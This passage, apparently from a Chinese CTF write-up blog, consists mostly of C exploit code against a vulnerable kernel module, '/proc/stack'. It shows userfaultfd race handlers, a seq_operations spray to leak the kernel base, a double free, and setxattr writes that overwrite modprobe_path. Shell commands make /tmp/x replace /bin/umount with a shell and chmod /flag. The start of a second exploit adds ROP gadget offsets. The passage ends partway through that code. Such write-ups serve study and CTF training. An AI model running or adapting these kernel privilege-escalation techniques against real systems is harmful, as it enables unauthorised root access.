class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_pause_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    pause();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//注册缺页错误处理</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_push</span><span class="params">(<span class="keyword">uint64_t</span>* arg)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0001</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_pop</span><span class="params">(<span class="keyword">uint64_t</span>* arg)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57ac0002</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">push_thread</span><span class="params">(<span class="keyword">void</span>* addr)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0001</span>,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">pop_thread</span><span class="params">(<span class="keyword">void</span>* addr)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0002</span>,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">setxattr_thread</span><span class="params">(<span class="keyword">void</span>* addr)</span></span>&#123;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>,<span class="string">&quot;bling&quot;</span>,addr,<span class="number">0x20</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_seq_operations</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">80</span>; i++)&#123;</span><br><span class="line">        fd_seq[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">59</span>; i++)&#123;</span><br><span class="line">        close(fd_seq[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fd_seq,<span class="number">0</span>,<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare</span><span class="params">()</span></span>&#123; </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nrm /bin/umount\necho -e \&quot;#!/bin/sh\\n/bin/sh\\n\&quot; &gt; /bin/umount\nchmod 777 /bin/umount&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fork()) &#123;</span><br><span class="line">        sleep(<span class="number">20</span>);                          </span><br><span class="line">        system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;ls -l /flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> ret_value = <span class="number">0</span>;</span><br><span class="line">    prepare();</span><br><span class="line"></span><br><span class="line">    fd_kstack = open(<span class="string">&quot;/proc/stack&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set userfaultfd</span></span><br><span class="line">    fault_addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr, userfaultfd_sleep3_handler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak kernel_base</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leaking kernel base address\n&quot;</span>);</span><br><span class="line">    prepare_seq_operations();           <span class="comment">// spray kernel addr in heap-0x20</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thr_push;</span><br><span class="line">    pthread_create(&amp;thr_push, <span class="literal">NULL</span>, push_thread, fault_addr);        <span class="comment">// stop at copy_from_user</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    cmd_pop(&amp;ret_value);                    <span class="comment">// kfree</span></span><br><span class="line">    kernel_base = ret_value - single_stop_off;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; kernel_base: 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// double free</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] creating double free\n&quot;</span>);</span><br><span class="line">    fault_addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr, userfaultfd_pause_handler);</span><br><span class="line">    fault_addr2 = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr2, userfaultfd_sleep3_handler);</span><br><span class="line">    fault_addr3 = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr3+<span class="number">0x1000</span>, userfaultfd_pause_handler);</span><br><span class="line">    fault_addr4 = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr4+<span class="number">0x1000</span>, userfaultfd_pause_handler);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)(fault_addr3+<span class="number">0x1000</span><span class="number">-0x8</span>) = modprobe_path_addr + kernel_base;            <span class="comment">// aaw: target address</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)(fault_addr4+<span class="number">0x1000</span><span class="number">-0x8</span>) = <span class="number">0x782f706d742f</span>;                              <span class="comment">// aaw: value - &quot;/tmp/x&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pthread_t</span> thr_pause,thr_pop;</span><br><span class="line">    pthread_create(&amp;thr_pause, <span class="literal">NULL</span>, push_thread, fault_addr);      <span class="comment">// kmalloc</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pthread_create(&amp;thr_pop, <span class="literal">NULL</span>, pop_thread, fault_addr2);        <span class="comment">// first kfree</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    cmd_pop(&amp;ret_value);       <span class="comment">// double kfree</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// malloc back</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] arbitrary write\n&quot;</span>);</span><br><span class="line">    <span class="keyword">pthread_t</span> setxattr1,setxattr2,setxattr3;</span><br><span class="line">    pthread_create(&amp;setxattr1, <span class="literal">NULL</span>, setxattr_thread, fault_addr3+<span class="number">0x1000</span><span class="number">-0x8</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pthread_create(&amp;setxattr2, <span class="literal">NULL</span>, setxattr_thread, fault_addr3+<span class="number">0x1000</span><span class="number">-0x8</span>);</span><br><span class="line">                            <span class="comment">// 不知道为什么，在这个期间，总是会有一个do_fork()的调用？？？导致modprobe_path那个块被提前占用了。</span></span><br><span class="line">    close(fd_seq[<span class="number">59</span>]);      <span class="comment">// 所以，增加一个kfree 0x20大小堆块的操作</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pthread_create(&amp;setxattr3, <span class="literal">NULL</span>, setxattr_thread, fault_addr4+<span class="number">0x1000</span><span class="number">-0x8</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);       <span class="comment">// 这里要sleep 1s，给线程一点时间将modprobe_path写完</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">60</span>; i &lt; <span class="number">80</span>; i++)&#123;</span><br><span class="line">        close(fd_seq[i]);               <span class="comment">// 防止后续申请0x20大小堆块时系统崩溃</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pause();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h3 id="exp3-1"   >
          <a href="#exp3-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp3-1" class="headerlink" title="exp3"></a>exp3</h3>
      <blockquote>
<p>跟exp2的区别在如何malloc回double free的堆块，这里先用seq_operations结构体占住堆块，再用”setxattr+userfaultfd”覆盖seq_operations-&gt;start指针，完成控制流劫持。最后使用ptregs+ROP修改modprobe_path提权。</p>
</blockquote>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BZIMAGE_ADDR 0xFFFFFFFF81000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd_kstack = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* fault_addr;</span><br><span class="line"><span class="keyword">char</span>* fault_addr2;</span><br><span class="line"><span class="keyword">char</span>* fault_addr3;</span><br><span class="line"><span class="keyword">uint64_t</span> fd_seq[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">uint64_t</span> temp_fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> single_stop_off = <span class="number">0xFFFFFFFF8113BE80</span> - BZIMAGE_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_path_addr = <span class="number">0xFFFFFFFF81C2C541</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> add_rsp_0x1f8_ret = <span class="number">0xffffffff814d51c0</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdx_rdi_ret = <span class="number">0xffffffff8122dd4b</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsi_ret = <span class="number">0xffffffff81047a8e</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> mov_qp_rdx_rdi_ret = <span class="number">0xffffffff8121216f</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> do_task_dead = <span class="number">0xFFFFFFFF8106EBB0</span> - BZIMAGE_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_sleep3_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_pause_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    pause();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, 